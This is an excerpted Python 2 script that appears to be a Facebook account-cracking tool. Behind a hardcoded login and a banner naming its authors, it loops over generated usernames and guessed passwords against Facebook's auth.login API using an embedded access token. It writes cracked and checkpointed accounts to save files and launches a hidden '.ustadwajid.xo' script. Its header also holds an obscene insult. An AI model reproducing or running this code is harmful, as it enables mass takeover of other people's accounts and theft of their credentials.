#!/usr/bin/python2
#coding=utf-8
#Author iZ IZZAT KARO HAMARI WARNA AGLA JANAM MA MAA CHOD DAYGA TUMHARI
#NAM TU SUNA HUG...
...
\033[1;90m [ HACKER IS COMPLE I REQUEST YOU COMPNY MY HACKER COMMAND ACCEPTED KNOW PLEASE SIR ]

\x1b[1;92m=============================
\x1b[1;93m Coder + Author iS : MY LOVE MY BROTHER IS THE AHMED
\x1b[1;93m FAMILY  : MY NACHER MY JOB AND MY ATTITUDE MY STYLE (RUN MUREED LOG)UNITY
\x1b[1;93m FaceBook : ALI ASAD
\x1b[1;93m Whatsapp:  +923096801986
\x1b[1;93m RULEX:  RECORD BREAKERS DON RULEX
\x1b[1;92m=============================
\x1b[1;93m     ➾       NOTE !
\x1b[1;91m=======================================
...
CorrectUsername = "USTADWAJID"
CorrectPassword = "ALIASAD"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
        ...
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:My Father My Love
	    time.sleep(2)
            loop = 'false'
        else:
...
def menu():
	os.system('clear')
	print logo
	print "\033[1;92m         [ USTAD WAJID X ALI ASAD { Pak Hacker } ]"
	print
...
def action():	
	...
	if bch =='':
	    ...
	    time.sleep(2)
	    os.system("python2 .ustadwajid.xo")
#	elif chb =='3':	
#	    os.system('xdg-open https://www.facebook.com/unknownXX007')
#	    time.sleep(1)
#	    menu()
	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92m[ iD iS Ok =HACKED BY DON]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass1																				
				...
				if 'www.facebook.com' in q['error_msg']:
					print '\x1b[1;95mDON \x1b[1;95m[iD iS CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass1
					...
					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                q = json.load(data)
					if 'access_token' in q:
		                        	print '\x1b[1;92m[ iD iS Ok =HACKED DON ]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;91m-' + pass2                            											
						okb = open('save/successfull.txt', 'a')
						...
						if 'www.facebook.com' in q['error_msg']:
							print '\x1b[1;93mDON\x1b[1;95m[iD iS CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass2
							cps = open('save/checkpoint.txt', 'a')
							...
							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			                                q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[ iD iS Ok =HACKED BY DONG]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
								okb = open('save/successfull.txt', 'a')
								...
								if 'www.facebook.com' in q['error_msg']:
									print '\x1b[1;96mDON\x1b[1;95m[iD iZ CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass3
									cps = open('save/checkpoint.txt', 'a')
